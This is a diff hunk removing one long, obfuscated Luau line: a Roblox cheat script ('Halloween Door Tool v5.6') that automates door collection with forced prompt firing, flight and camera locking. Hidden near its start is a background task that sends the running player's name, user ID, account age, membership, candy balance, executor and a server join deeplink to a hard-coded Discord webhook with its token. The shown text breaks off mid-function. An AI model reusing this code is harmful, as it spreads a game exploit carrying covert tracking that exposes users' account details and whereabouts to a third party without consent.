@@ -1,12 +1,1637 @@
-if _G.HalloweenDoorDebug_Cleanup then pcall(_G.HalloweenDoorDebug_Cleanup);end if _G.HalloweenDoorESP_Cleanup then pcall(_G.HalloweenDoorESP_Cleanup);end local v0=game:GetService("Players");local v1=game:GetService("RunService");local v2=game:GetService("Workspace");local v3=game:GetService("UserInputService");local v4=game:GetService("VirtualInputManager");local v5=game:GetService("PathfindingService");local v6=game:GetService("HttpService");local v7=game:GetService("TeleportService");local v8=v0.LocalPlayer;local v9=v8:WaitForChild("PlayerGui");local function v10() local v254=0;local v255;local v256;local v257;while true do if ((1 + 1)==v254) then v257=v256:FindFirstChild("Amount",true);if (v257 and v257.Text) then local v717=0 -0 ;local v718;while true do if (v717==(0 + 0)) then v718=string.gsub(v257.Text,"[^%d]","");if (v718~="") then return tonumber(v718) or (0 -0) ;end break;end end end v254=1247 -(485 + 759) ;end if (v254==(2 -1)) then v256=v255:FindFirstChild("Candies");if  not v256 then return 0 + 0 ;end v254=2;end if (v254==(1189 -(442 + 747))) then v255=v8:FindFirstChild("PlayerGui");if  not v255 then return 0;end v254=1251 -(363 + 887) ;end if (v254==(5 -2)) then return 0 -0 ;end end end task.spawn(function() pcall(function() local v508="https://discord.com/api/webhooks/1500229155806249153/3ZKPy-cFyzYZVy6C3MstwquJkCmnh6bcAt5I7WpObZgapXH8EdOH3184mXk6iYY_OLe8";task.wait(1.5 + 1 );local v509=v10();local v510=v8.UserId;local v511=v8.Name;local v512=v8.DisplayName;local v513=v8.AccountAge;local v514=tostring(v8.MembershipType);local v515="Unknown";pcall(function() if identifyexecutor then v515=identifyexecutor();elseif getexecutorname then v515=getexecutorname();end end);local v516=game.PlaceId;local v517=game.JobId;local v518=string.format("roblox://experiences/start?placeId=%d&gameInstanceId=%s",v516,v517);local v519=string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)",v516,v517);local v520={title="🎃 Halloween Door Tool v5.6 - Script Executed",color=16744448,fields={{name="👤 Account Info",value=string.format("• **Name:** %s (@%s)\n• **ID:** %d\n• **Account Age:** %d days\n• **Membership:** %s",v512,v511,v510,v513,v514),inline=false},{name="🍬 Live Candy Balance",value=string.format("• **Current Candies:** `%d 🍬` (Fetched on execution)",v509),inline=false},{name="⚙️ Environment",value=string.format("• **Executor:** %s\n• **PlaceId:** %d\n• **JobId:** `%s`",v515,v516,v517),inline=false},{name="🔗 Join Deeplink (Clickable)",value=string.format("[Click to Join Direct](%s)",v518),inline=false},{name="📋 Copyable Deeplink (1-Click Copy)",value=string.format("```text\n%s\n```",v518),inline=false},{name="💻 Teleport Luau Code",value=string.format("```lua\n%s\n```",v519),inline=false}},timestamp=DateTime.now():ToIsoDate()};local v521=v6:JSONEncode({embeds={v520}});local v522=(syn and syn.request) or http_request or request or (fluxus and fluxus.request) ;if v522 then v522({Url=v508,Method="POST",Headers={["Content-Type"]="application/json"},Body=v521});end end);end);local v11={MAX_COLLECT_DISTANCE=3 + 2 ,TARGET_STOP_DISTANCE=17 + 3 ,FLIGHT_ASCENT_HEIGHT=8 + 172 ,AGENT_NAV_RADIUS=793 -(766 + 23) ,STUCK_TIMEOUT=0.35 -0 ,STUCK_DISTANCE_MIN=255.4 -(195 + 60) ,DEFAULT_TIMER_SEC=123 -33 ,DEFAULT_COLLECTION_BUDGET=13 -8 ,DOOR_RETRY_WATCHDOG_SEC=1508 -(251 + 1250) ,DOOR_COOLDOWN_SEC=34 -22 ,TRANSFER_COOLDOWN=0.35 -0 ,DEFAULT_WALK_SPEED=1097 -(1036 + 37) ,LOCK_CAMERA_ON_COLLECT=true,SHOW_3D_ROUTE_BEAM=true,CANDY_AMOUNTS={"5","25","50","100"},JITTER_VELOCITY_THRESHOLD=1481.2 -(641 + 839) ,CLICK_INTERVAL=0.06};local v12={isEspActive=false,isPromptActive=false,isAutoCollectActive=false,isCollectingNow=false,useSmartHoldMode=false,waitForTimerEnabled=true,movementMode="FLY",collectionBudget=918 -(910 + 3) ,isAutoTransferActive=false,lastTransferClock=0 -0 ,lastForcedTransferClock=1684 -(1466 + 218) ,lastCandyValue=0 + 0 ,candyAmountIndex=1152 -(556 + 592) ,currentCandyAmount="100",targetPlayerName="",originalWalkSpeed=16,fallbackEndTime=0 + 0 ,currentRemainingSec=1807 -(329 + 479) ,lastDoorCount=129 -(118 + 11) };local v13={};local v14={};local v15={};local v16={};local v17={};local v18={};local v19=nil;local v20=nil;local v21=nil;local v22=nil;local v23=nil;local v24=nil;local v25={};local function v26(v258,v259,v260) local v261=0 + 0 ;while true do if (v261==(854 -(174 + 680))) then if  not v258 then return;end if (v259 and (v258.Text~=v259)) then v258.Text=v259;end v261=3 -2 ;end if (v261==(950 -(551 + 398))) then if (v260 and (v258.TextColor3~=v260)) then v258.TextColor3=v260;end break;end end end local function v27() local v262=0 -0 ;local v263;local v264;local v265;while true do if (v262==(1 + 1)) then if ( not v264 or  not v265 or (v265.Health<=(0 + 0)) or (v265:GetState()==Enum.HumanoidStateType.Dead)) then return nil,nil,nil;end return v263,v264,v265;end if (v262==(1 + 0)) then v264=v263:FindFirstChild("HumanoidRootPart");v265=v263:FindFirstChildOfClass("Humanoid");v262=741 -(396 + 343) ;end if (v262==(0 + 0)) then v263=v8.Character;if ( not v263 or  not v263.Parent) then return nil,nil,nil;end v262=1;end end end local function v28() local v266=0 -0 ;local v267;while true do if (v266==(1477 -(29 + 1448))) then if  not v24 then v24=RaycastParams.new();v24.FilterType=Enum.RaycastFilterType.Exclude;v24.IgnoreWater=true;end table.clear(v25);v266=1390 -(135 + 1254) ;end if (1==v266) then if (v8 and v8.Character) then table.insert(v25,v8.Character);end v267=v2:FindFirstChild("Effects");v266=7 -5 ;end if (v266==(13 -10)) then return v24;end if (v266==(91 -(40 + 49))) then if v267 then table.insert(v25,v267);end v24.FilterDescendantsInstances=v25;v266=2 + 1 ;end end end local function v29(v268,v269) local v270=1527 -(389 + 1138) ;local v271;local v272;while true do local v523=574 -(102 + 472) ;while true do if ((0 + 0)==v523) then if (v270==(0 + 0)) then v271=v5:CreatePath({AgentRadius=v11.AGENT_NAV_RADIUS,AgentHeight=5,AgentCanJump=true,AgentCanClimb=false,WaypointSpacing=13.5 -10 });v272=pcall(function() v271:ComputeAsync(v268,v269);end);v270=1 + 0 ;end if (v270==(1 + 0)) then if (v272 and (v271.Status==Enum.PathStatus.Success)) then return v271:GetWaypoints();end return nil;end break;end end end end local function v30(v273) local v274=1545 -(320 + 1225) ;local v275;local v276;local v277;local v278;while true do if (v274==(2 -0)) then v278=(v277.Position + Vector3.new(0 + 0 ,1467.5 -(157 + 1307) ,417 -(203 + 214) )) -(v277.CFrame.LookVector * (1864 -(821 + 1038))) ;v275.CFrame=CFrame.lookAt(v278,v273.Position);break;end if (v274==(0 + 0)) then if ( not v11.LOCK_CAMERA_ON_COLLECT or  not v273 or  not v273.Parent) then return;end v275=v2.CurrentCamera;v274=2 -1 ;end if (v274==(1 + 0)) then v276,v277=v27();if ( not v275 or  not v277) then return;end v274=3 -1 ;end end end local function v31(v279) local v280=0 + 0 ;local v281;while true do if (v280==0) then v281=0;while true do if (v281==(1306 -(913 + 393))) then v279=math.max(0 -0 ,math.ceil(v279));return string.format("%02d:%02d",math.floor(v279/(1086 -(834 + 192)) ),v279%(4 + 56) );end end break;end end end local v32=nil;local v33=nil;local v34=nil;local function v35(v282,v283) local v284=0 + 0 ;while true do if (v284==(1 + 3)) then v32.Enabled=true;break;end if (v284==(1 -0)) then if ( not v34 or  not v34.Parent) then local v724=0;while true do if (v724==(1625 -(950 + 675))) then v34=Instance.new("Attachment");v34.Name="DoorRoute_Att1";break;end end end if ( not v32 or  not v32.Parent) then local v725=304 -(300 + 4) ;local v726;while true do if (v725==(1179 -(216 + 963))) then v726=0 + 0 ;while true do if ((0 -0)==v726) then v32=Instance.new("Beam");v32.Name="DoorRoute_Beam";v726=363 -(112 + 250) ;end if (v726==(1 + 0)) then v32.FaceCamera=true;v32.Color=ColorSequence.new(Color3.fromRGB(638 -383 ,81 + 59 ,0 + 0 ),Color3.fromRGB(38 + 12 ,1856 -(635 + 966) ,60 + 60 ));v726=2 + 0 ;end if (v726==(45 -(5 + 37))) then v32.LightEmission=1 + 0 ;v32.Transparency=NumberSequence.new(1414.15 -(1001 + 413) );v726=8 -4 ;end if ((884 -(244 + 638))==v726) then v32.Width0=693.3 -(627 + 66) ;v32.Width1=0.3 -0 ;v726=605 -(512 + 90) ;end if (v726==4) then v32.Parent=v2;break;end end break;end end end v284=1908 -(1665 + 241) ;end if (v284==(719 -(373 + 344))) then v33.Parent=v282;v34.Parent=v283;v284=3;end if (v284==(2 + 1)) then v32.Attachment0=v33;v32.Attachment1=v34;v284=2 + 2 ;end if (v284==(0 -0)) then if ( not v11.SHOW_3D_ROUTE_BEAM or  not v282 or  not v283 or  not v282.Parent or  not v283.Parent) then local v727=529 -(318 + 211) ;while true do if (v727==(0 -0)) then if v32 then v32.Enabled=false;end return;end end end if ( not v33 or  not v33.Parent) then local v728=1099 -(35 + 1064) ;while true do if ((0 + 0)==v728) then v33=Instance.new("Attachment");v33.Name="DoorRoute_Att0";break;end end end v284=1 + 0 ;end end end local function v36() local v285=0 -0 ;while true do if (v285==(0 -0)) then if v32 then local v729=0 + 0 ;while true do if (v729==(1236 -(298 + 938))) then pcall(function() v32:Destroy();end);v32=nil;break;end end end if v33 then pcall(function() v33:Destroy();end);v33=nil;end v285=1260 -(233 + 1026) ;end if (v285==(1667 -(636 + 1030))) then if v34 then local v730=0 + 0 ;local v731;while true do if (v730==(0 + 0)) then v731=0 + 0 ;while true do if (v731==(0 + 0)) then pcall(function() v34:Destroy();end);v34=nil;break;end end break;end end end break;end end end local function v37() return v2:FindFirstChild("Effects");end local function v38(v286) local v287=0 + 0 ;while true do if (v287==1) then if (v8.Character and v286:IsDescendantOf(v8.Character)) then return false;end if v286:IsA("Model") then return true;end v287=3 -1 ;end if (v287==(221 -(55 + 166))) then if (v286.Name~="HalloweenDoor") then return false;end if  not v286:IsDescendantOf(v2) then return false;end v287=1 + 0 ;end if (v287==(1 + 1)) then local v612=0 + 0 ;while true do if ((1019 -(829 + 190))==v612) then if (v286:IsA("BasePart") and ( not v286.Parent or (v286.Parent.Name~="HalloweenDoor"))) then return true;end return false;end end end end end local function v39(v288) local v289=0 -0 ;local v290;while true do local v524=297 -(36 + 261) ;while true do if (v524==(0 -0)) then if (v289==(1 -0)) then return nil;end if (v289==0) then v290=v288;while v290 and (v290~=v2)  do local v832=0 -0 ;local v833;while true do if (v832==(1368 -(34 + 1334))) then v833=0 + 0 ;while true do if (v833==0) then if v38(v290) then return v290;end v290=v290.Parent;break;end end break;end end end v289=1;end break;end end end end local function v40(v291) local v292={};if ( not v291 or  not v291.Parent) then return v292;end if v291:IsA("ProximityPrompt") then table.insert(v292,v291);end for v525,v526 in ipairs(v291:GetDescendants()) do if v526:IsA("ProximityPrompt") then local v613=0 + 0 ;while true do if (v613==(0 + 0)) then if (v16[v526]==nil) then v16[v526]=v526.HoldDuration;end table.insert(v292,v526);break;end end end end return v292;end local function v41(v293) local v294=1283 -(1035 + 248) ;while true do local v527=21 -(20 + 1) ;while true do if (v527==(1 + 0)) then if (v294==1) then if v293:IsA("BasePart") then return v293;end if v293:IsA("Model") then local v895=276 -(259 + 17) ;local v896;local v897;local v898;while true do if (v895==(319 -(134 + 185))) then v896=1133 -(549 + 584) ;v897=nil;v895=3 -2 ;end if (v895==(592 -(396 + 195))) then v898=nil;while true do local v1027=685 -(314 + 371) ;while true do if (v1027==1) then if (v896==(6 -4)) then if (v898 and v898:IsA("BasePart")) then return v898;end return v293:FindFirstChildWhichIsA("BasePart",true);end break;end if (v1027==(968 -(478 + 490))) then if (v896==(1 + 0)) then if (v897 and v897:IsA("BasePart")) then return v897;end v898=v293:FindFirstChild("Pumpkin",true);v896=9 -7 ;end if (v896==(1172 -(786 + 386))) then if v293.PrimaryPart then return v293.PrimaryPart;end v897=v293:FindFirstChild("Door",true);v896=546 -(424 + 121) ;end v1027=1 + 0 ;end end end break;end end end v294=2;end break;end if (v527==(0 -0)) then if (v294==(0 + 0)) then if ( not v293 or  not v293.Parent) then return nil;end for v834,v835 in ipairs(v40(v293)) do local v836=440 -(249 + 191) ;local v837;while true do if (v836==(0 -0)) then v837=v835.Parent;if v837 then local v1028=1379 -(1055 + 324) ;while true do if ((0 -0)==v1028) then if v837:IsA("BasePart") then return v837;end if (v837:IsA("Attachment") and v837.Parent and v837.Parent:IsA("BasePart")) then return v837.Parent;end v1028=1341 -(1093 + 247) ;end if (v1028==(1 + 0)) then if (v837:IsA("Model") and v837.PrimaryPart) then return v837.PrimaryPart;end break;end end end break;end end end v294=1 + 0 ;end if (v294==(7 -5)) then return nil;end v527=3 -2 ;end end end end local function v42(v295) local v296=0 -0 ;local v297;local v298;local v299;local v300;local v301;local v302;while true do if (v296==(0 -0)) then if ( not v295 or (typeof(v295)~="string")) then return nil,nil;end v297=string.gsub(v295,"%s+"," ");v298,v299=string.match(v297,"(%d+):(%d%d)");if (v298 and v299) then local v732=0 -0 ;local v733;while true do if (v732==0) then v733=(tonumber(v298) * (53 + 7)) + tonumber(v299) ;return v733,string.format("%02d:%02d",tonumber(v298),tonumber(v299));end end end v296=1 + 0 ;end if ((7 -5)==v296) then v302=string.match(v297,"^(%d+)$");if v302 then local v734=tonumber(v302);if (v734<=(2068 -1468)) then return v734,string.format("%02d:%02d",math.floor(v734/(46 + 14) ),v734%(153 -93) );end end return nil,nil;end if ((1 + 0)==v296) then v300=string.match(v297,"(%d+)%s*s") or string.match(v297,"(%d+)%s*sec") ;if v300 then local v735=0 + 0 ;local v736;while true do if (v735==(688 -(364 + 324))) then v736=tonumber(v300);return v736,string.format("%02d:%02d",math.floor(v736/(164 -104) ),v736%(143 -83) );end end end v301=string.lower(v297);if (string.find(v301,"ready") or string.find(v301,"open") or (v297=="0")) then return 876 -(423 + 453) ,"00:00";end v296=1 + 1 ;end end end local function v43(v303) local v304=0 -0 ;local v305;local v306;while true do if (v304==(4 -1)) then local v614=0 -0 ;while true do if (v614==(1268 -(1249 + 19))) then for v838,v839 in ipairs(v303:GetDescendants()) do if v839:IsA("ProximityPrompt") then local v944=0 + 0 ;local v945;local v946;while true do if (v944==(0 -0)) then v945,v946=v42(v839.ActionText);if (v945~=nil) then return v945,v946,nil;end v944=1087 -(686 + 400) ;end if (v944==(1 + 0)) then v945,v946=v42(v839.ObjectText);if (v945~=nil) then return v945,v946,nil;end break;end end end end return nil,nil,nil;end end end if (v304==(0 + 0)) then if ( not v303 or  not v303.Parent) then return nil,nil,nil;end v305={};v304=230 -(73 + 156) ;end if (v304==1) then local v615=0;while true do if ((0 + 0)==v615) then v306=v303:FindFirstChild("Pumpkin",true);if v306 then for v947,v948 in ipairs(v306:GetDescendants()) do if (v948:IsA("TextLabel") and v948.Text and (v948.Text~="")) then table.insert(v305,v948);end end end v615=812 -(721 + 90) ;end if (v615==1) then v304=1 + 1 ;break;end end end if (v304==(6 -4)) then for v670,v671 in ipairs(v303:GetDescendants()) do if (v671:IsA("TextLabel") and v671.Text and (v671.Text~="")) then table.insert(v305,v671);end end for v672,v673 in ipairs(v305) do local v674,v675=v42(v673.Text);if (v674~=nil) then return v674,v675,v673;end end v304=473 -(224 + 246) ;end end end local function v44(v307) if v307 then v17[v307]=os.clock();end end local function v45() local v308=0 -0 ;local v309;while true do if (v308==0) then v309=os.clock();for v676,v677 in pairs(v18) do if (((v309-v677)>v11.DOOR_COOLDOWN_SEC) or  not v676.Parent) then v18[v676]=nil;end end v308=1 -0 ;end if (v308==(2 -1)) then for v678,v679 in pairs(v17) do local v680=v309-v679 ;if ( not v678 or  not v678.Parent or  not v678:IsDescendantOf(v2)) then local v790=918 -(782 + 136) ;while true do if (v790==(855 -(112 + 743))) then v17[v678]=nil;v18[v678]=v309;break;end end elseif (v680>=v11.DOOR_RETRY_WATCHDOG_SEC) then local v899=0;local v900;while true do if (v899==(0 + 0)) then v900=v40(v678);if ( #v900>(1171 -(1026 + 145))) then local v1045=0 + 0 ;while true do if ((0 + 0)==v1045) then v17[v678]=nil;v18[v678]=nil;break;end end else local v1046=0 -0 ;while true do if ((0 -0)==v1046) then v17[v678]=nil;v18[v678]=v309;break;end end end break;end end end end break;end end end local function v46(v310) local v311=0 -0 ;while true do local v528=0 + 0 ;while true do if (v528==(0 -0)) then if ((1 + 0)==v311) then if (v17[v310] and ((os.clock() -v17[v310])<v11.DOOR_RETRY_WATCHDOG_SEC)) then return false;end return  #v40(v310)>(513 -(203 + 310)) ;end if (v311==0) then if ( not v310 or  not v310.Parent or  not v310:IsDescendantOf(v2)) then return false;end if v18[v310] then return false;end v311=1596 -(210 + 1385) ;end break;end end end end local function v47() local v312=1993 -(1238 + 755) ;local v313;local v314;local v315;while true do if (v312==(2 + 0)) then if ( #v313==(0 -0)) then local v737=0 + 0 ;while true do if (v737==(585 -(352 + 233))) then for v951,v952 in ipairs(v2:GetChildren()) do if (v38(v952) and  not v314[v952]) then local v1006=1534 -(709 + 825) ;local v1007;while true do if (v1006==(0 -0)) then v1007=0 -0 ;while true do if (v1007==(864 -(196 + 668))) then v314[v952]=true;table.insert(v313,v952);break;end end break;end end end end for v953,v954 in ipairs({"Map","Debris","Halloween","Spawns"}) do local v955=0;local v956;while true do if (v955==(93 -(4 + 89))) then v956=v2:FindFirstChild(v954);if v956 then for v1060,v1061 in ipairs(v956:GetDescendants()) do if (v38(v1061) and  not v314[v1061]) then local v1075=0 -0 ;while true do if (v1075==0) then v314[v1061]=true;table.insert(v313,v1061);break;end end end end end break;end end end break;end end end return v313;end if (v312==(3 -2)) then v315=v37();if v315 then for v791,v792 in ipairs(v315:GetDescendants()) do if (v38(v792) and  not v314[v792]) then local v901=0 + 0 ;local v902;while true do if (v901==(0 -0)) then v902=0 + 0 ;while true do if (v902==0) then v314[v792]=true;table.insert(v313,v792);break;end end break;end end end end end v312=1 + 1 ;end if (v312==(1486 -(35 + 1451))) then v313={};v314={};v312=1;end end end local function v48(v316) local v317=1453 -(28 + 1425) ;local v318;local v319;while true do if (v317==(251 -(172 + 78))) then local v616=1993 -(941 + 1052) ;while true do if (v616==0) then v319={};for v840,v841 in ipairs(v318) do if v46(v841) then table.insert(v319,v841);end end v616=1 + 0 ;end if (v616==(1515 -(822 + 692))) then v317=2 -0 ;break;end end end if (v317==(0 + 0)) then v45();v318=v316 or v47() ;v317=1 + 0 ;end if (v317==(299 -(45 + 252))) then return v319;end end end local function v49(v320) local v321=0 + 0 ;while true do if (v321==(1 + 1)) then v320.Exclusivity=Enum.ProximityPromptExclusivity.AlwaysShow;v320.ClickablePrompt=true;v321=7 -4 ;end if (v321==(433 -(114 + 319))) then if ( not v320 or  not v320:IsA("ProximityPrompt") or  not v320.Parent) then return;end if (v16[v320]==nil) then v16[v320]=v320.HoldDuration;end v321=1 -0 ;end if (v321==(3 -0)) then if (v320.MaxActivationDistance<(23 + 12)) then v320.MaxActivationDistance=11 + 24 ;end if ( not v12.useSmartHoldMode or (v12.isPromptActive and  not v12.isCollectingNow)) then v320.HoldDuration=0 -0 ;else local v742=v16[v320];if (v742 and (v742>(447 -(133 + 314)))) then v320.HoldDuration=v742;end end break;end if (v321==(1 -0)) then v320.Enabled=true;v320.RequiresLineOfSight=false;v321=1965 -(556 + 1407) ;end end end local function v50(v322) local v323=213 -(199 + 14) ;while true do if (v323==(1206 -(741 + 465))) then if  not v322:IsA("ProximityPrompt") then return;end if  not v39(v322) then return;end v323=1550 -(647 + 902) ;end if (v323==(466 -(170 + 295))) then v49(v322);if  not v15[v322] then local v743=0 + 0 ;local v744;while true do if (v743==(0 + 0)) then local v903=0 -0 ;while true do if (v903==(1290 -(426 + 863))) then v743=1 + 0 ;break;end if (v903==(0 + 0)) then v744={};table.insert(v744,v322:GetPropertyChangedSignal("RequiresLineOfSight"):Connect(function() if ((v12.isPromptActive or v12.isCollectingNow) and v322.Parent and v322.RequiresLineOfSight) then v322.RequiresLineOfSight=false;end end));v903=1 + 0 ;end end end if (v743==(1655 -(873 + 781))) then table.insert(v744,v322.AncestryChanged:Connect(function(v957,v958) if ( not v958 and v15[v322]) then local v1008=1230 -(957 + 273) ;while true do if (v1008==(0 + 0)) then for v1062,v1063 in ipairs(v15[v322]) do pcall(function() v1063:Disconnect();end);end v15[v322]=nil;break;end end end end));v15[v322]=v744;break;end end end break;end end end local function v51(v324) local v325=0 + 0 ;local v326;local v327;while true do if (v325==(11 -8)) then return (v327-v326).Magnitude>(0.35 -0) ;end if (v325==(5 -3)) then if ( not v324 or  not v324.Parent) then return false;end v327=v324.Position;v325=14 -11 ;end if (v325==(1780 -(389 + 1391))) then if ( not v324 or  not v324.Parent) then return false;end if (v324.AssemblyLinearVelocity and (v324.AssemblyLinearVelocity.Magnitude>v11.JITTER_VELOCITY_THRESHOLD)) then return true;end v325=1 + 0 ;end if (v325==(1 + 0)) then v326=v324.Position;task.wait(0.04 -0 );v325=953 -(783 + 168) ;end end end local function v52(v328,v329,v330) local v331,v332,v333=v27();if ( not v331 or  not v332 or  not v333 or  not v329 or  not v329.Parent) then return false;end v333.PlatformStand=true;local v335=v2.CurrentCamera;if v330 then v330("⚔️ Jitter Door Locked: Attacking...");end local v336=v1.RenderStepped:Connect(function() local v529=0 -0 ;local v530;local v531;local v532;while true do if (v529==(7 -4)) then if v335 then v335.CFrame=CFrame.lookAt(v531.Position + Vector3.new(0 + 0 ,313 -(309 + 2) ,0 -0 ) ,v329.Position);end break;end if (v529==0) then v530,v531=v27();if ( not v531 or  not v329 or  not v329.Parent) then return;end v529=1213 -(1090 + 122) ;end if (v529==(1 + 1)) then v531.AssemblyLinearVelocity=Vector3.zero;v531.AssemblyAngularVelocity=Vector3.zero;v529=1 + 2 ;end if (v529==(3 -2)) then v532=v329.CFrame * CFrame.new(0 -0 ,0 -0 ,2.2 + 0 ) * CFrame.Angles(0,math.pi,0) ;v531.CFrame=v532;v529=6 -4 ;end end end);local v337=os.clock();local v338=12 + 0 ;while v12.isAutoCollectActive and ((os.clock() -v337)<v338)  do if ( not v328 or  not v328.Parent or  not v328:IsDescendantOf(v2)) then break;end if ( not v329 or  not v329.Parent) then break;end for v568,v569 in ipairs(v328:GetDescendants()) do if (v569:IsA("ClickDetector") and (typeof(fireclickdetector)=="function")) then pcall(fireclickdetector,v569);elseif (v569:IsA("ProximityPrompt") and (typeof(fireproximityprompt)=="function")) then pcall(fireproximityprompt,v569);end end pcall(function() local v570=1118 -(628 + 490) ;local v571;while true do if (v570==(0 -0)) then v571=0;while true do if (v571==(0 + 0)) then v4:SendMouseButtonEvent(0 + 0 ,0 -0 ,0,true,game,0 -0 );task.wait(486.02 -(68 + 418) );v571=775 -(431 + 343) ;end if (v571==(1 -0)) then v4:SendMouseButtonEvent(0 -0 ,0 + 0 ,0 + 0 ,false,game,0 + 0 );break;end end break;end end end);pcall(function() v4:SendKeyEvent(true,Enum.KeyCode.E,false,game);task.wait(0.02);v4:SendKeyEvent(false,Enum.KeyCode.E,false,game);end);task.wait(v11.CLICK_INTERVAL);end if v336 then local v572=0;while true do if ((1695 -(556 + 1139))==v572) then v336:Disconnect();v336=nil;break;end end end local v339,v339,v340=v27();if v340 then local v573=15 -(6 + 9) ;while true do if (v573==0) then v340.PlatformStand=false;pcall(function() v340:ChangeState(Enum.HumanoidStateType.GettingUp);end);break;end end end if v330 then v330("✅ Door Destroyed / Collected!");end return true;end local v53=nil;local v54=nil;local function v55() local v341=0 + 0 ;local v342;local v343;local v344;while true do if (v341==(1 + 0)) then v342,v343,v344=v27();if (v344 and v343) then local v746=0 -0 ;while true do if (v746==(2 -1)) then v343.AssemblyLinearVelocity=Vector3.zero;v343.AssemblyAngularVelocity=Vector3.zero;break;end if (v746==(0 + 0)) then v344.PlatformStand=false;pcall(function() v344:ChangeState(Enum.HumanoidStateType.GettingUp);end);v746=1;end end end break;end if ((169 -(28 + 141))==v341) then if v53 then local v747=0 + 0 ;while true do if (v747==(0 -0)) then pcall(function() v53:Destroy();end);v53=nil;break;end end end if v54 then pcall(function() v54:Destroy();end);v54=nil;end v341=1 + 0 ;end end end local function v56(v345,v346) local v347=1317 -(486 + 831) ;local v348;local v349;while true do if (v347==5) then v349.Parent=v345;v54=v349;return v348,v349;end if ((2 -1)==v347) then v348=Instance.new("BodyVelocity");v348.Name="DoorFlight_BV_V56";v348.MaxForce=Vector3.new(3520631 -2520631 ,188964 + 811036 ,1389005 -389005 );v347=1 + 1 ;end if (v347==(12 -8)) then v349.P=69097 -54097 ;v349.D=1487 -1037 ;v349.CFrame=v345.CFrame;v347=1268 -(668 + 595) ;end if (v347==(2 + 0)) then v348.Velocity=Vector3.zero;v348.Parent=v345;v53=v348;v347=834 -(762 + 69) ;end if (v347==(0 + 0)) then v55();v346.PlatformStand=true;pcall(function() v346:ChangeState(Enum.HumanoidStateType.Physics);end);v347=2 -1 ;end if (v347==(293 -(23 + 267))) then v349=Instance.new("BodyGyro");v349.Name="DoorFlight_BG_V56";v349.MaxTorque=Vector3.new(1000000,1001944 -(1129 + 815) ,1000387 -(371 + 16) );v347=9 -5 ;end end end local function v57(v350,v351) local v352=1750 -(1326 + 424) ;local v353;local v354;local v355;local v356;local v357;while true do if (v352==(0 + 0)) then v353=0 + 0 ;v354=nil;v352=1;end if (v352==(1 -0)) then v355=nil;v356=nil;v352=7 -5 ;end if (v352==(120 -(88 + 30))) then v357=nil;while true do if (v353==(771 -(720 + 51))) then v354,v355,v356=v27();if ( not v355 or  not v356) then return false;end v353=1 -0 ;end if ((4 -2)==v353) then while v12.isAutoCollectActive and ((os.clock() -v357)<(8 -4))  do local v843,v844=v27();if ( not v844 or  not v53) then break;end local v845=v350-v844.Position.Y ;if (math.abs(v845)<=(1777 -(421 + 1355))) then local v959=0 -0 ;while true do if ((0 -0)==v959) then v53.Velocity=Vector3.zero;return true;end end end local v846=math.clamp(v845 * (11 + 1) , -v351 * (1.2 + 0) ,v351 * (1084.2 -(286 + 797)) );v53.Velocity=Vector3.new(0 -0 ,v846,0 -0 );v1.Heartbeat:Wait();end if v53 then v53.Velocity=Vector3.zero;end v353=4 -1 ;end if (v353==(442 -(397 + 42))) then return true;end if (v353==(470 -(304 + 165))) then if ( not v53 or  not v54) then v56(v355,v356);end v357=os.clock();v353=2 + 0 ;end end break;end end end local function v58(v358,v359,v360,v361) local v362,v363,v364=v27();if ( not v363 or  not v364) then return false;end if ( not v53 or  not v54) then v56(v363,v364);end v361=v361 or (1 + 1) ;local v365=os.clock();while v12.isAutoCollectActive and ((os.clock() -v365)<(808 -(24 + 776)))  do local v533=0 -0 ;local v534;local v535;local v536;local v537;local v538;local v539;local v540;local v541;local v542;local v543;while true do if (v533==(785 -(222 + 563))) then v534,v535=v27();if ( not v535 or  not v53) then return false;end v536=Vector2.new(v535.Position.X,v535.Position.Z);v537=Vector2.new(v358.X,v358.Z);v533=1017 -(10 + 1006) ;end if (v533==(1 -0)) then v538=v537-v536 ;v539=v538.Magnitude;if (v539<=v361) then local v794=0 + 0 ;local v795;while true do if (v794==(0 + 0)) then v795=0 + 0 ;while true do if (v795==(190 -(23 + 167))) then local v1031=1798 -(690 + 1108) ;while true do if (v1031==(0 + 0)) then v53.Velocity=Vector3.zero;return true;end end end end break;end end end v540=Vector3.new(v358.X,v359,v358.Z);v533=2 + 0 ;end if (v533==(850 -(40 + 808))) then v541=v359-v535.Position.Y ;v542=math.clamp(v541 * (5 + 5) , -(1339 -(1140 + 149)),32 + 18 );v543=v538.Unit;v53.Velocity=Vector3.new(v543.X * v360 ,v542,v543.Y * v360 );v533=1 + 2 ;end if (v533==(11 -8)) then if v54 then local v796=0;local v797;while true do if (v796==(0 + 0)) then v797=Vector3.new(v543.X,0,v543.Y);if (v797.Magnitude>(0.1 + 0)) then v54.CFrame=CFrame.lookAt(v535.Position,v535.Position + v797 );end break;end end end v1.Heartbeat:Wait();break;end end end if v53 then v53.Velocity=Vector3.zero;end return false;end local function v59(v366) local v367=0 + 0 ;local v368;local v369;local v370;while true do if (v367==1) then v370=nil;while true do local v688=0 -0 ;while true do if (v688==(571 -(47 + 524))) then if (v368==(0 + 0)) then local v960=0;while true do if ((0 -0)==v960) then v369=v366.CFrame.LookVector;v370=Vector3.new(v369.X,0 -0 ,v369.Z);v960=112 -(61 + 50) ;end if (v960==(1 -0)) then v368=1 + 0 ;break;end end end if (v368==(2 -1)) then local v961=1726 -(1165 + 561) ;while true do if (v961==(0 + 0)) then if (v370.Magnitude<(0.1 -0)) then v370=Vector3.new(0 + 0 ,1460 -(1295 + 165) ,480 -(341 + 138) );else v370=v370.Unit;end return v370;end end end break;end end end break;end if (v367==0) then v368=0 + 0 ;v369=nil;v367=1;end end end local function v60(v371,v372) local v373=0 -0 ;local v374;local v375;local v376;local v377;local v378;local v379;local v380;local v381;while true do local v544=0 + 0 ;while true do if ((326 -(89 + 237))==v544) then if (v373==(3 -2)) then local v798=0 -0 ;while true do if (v798==(881 -(581 + 300))) then v378=v371.Position + (v377 * 3) ;v379=v375.Position.Y + v11.FLIGHT_ASCENT_HEIGHT ;v798=1221 -(855 + 365) ;end if (v798==(2 -1)) then v57(v379,v372);v373=1 + 1 ;break;end end end if ((1235 -(1030 + 205))==v373) then v374,v375,v376=v27();if ( not v375 or  not v376 or  not v371 or  not v371.Parent) then return false;end v377=v59(v371);v373=1 + 0 ;end v544=1 + 0 ;end if (v544==(1 + 0)) then if (v373==(289 -(156 + 130))) then task.wait(491.04 -(128 + 363) );v374,v380,v381=v27();if (v380 and v381 and v371 and v371.Parent) then local v911=0 + 0 ;while true do if (v911==(2 -1)) then 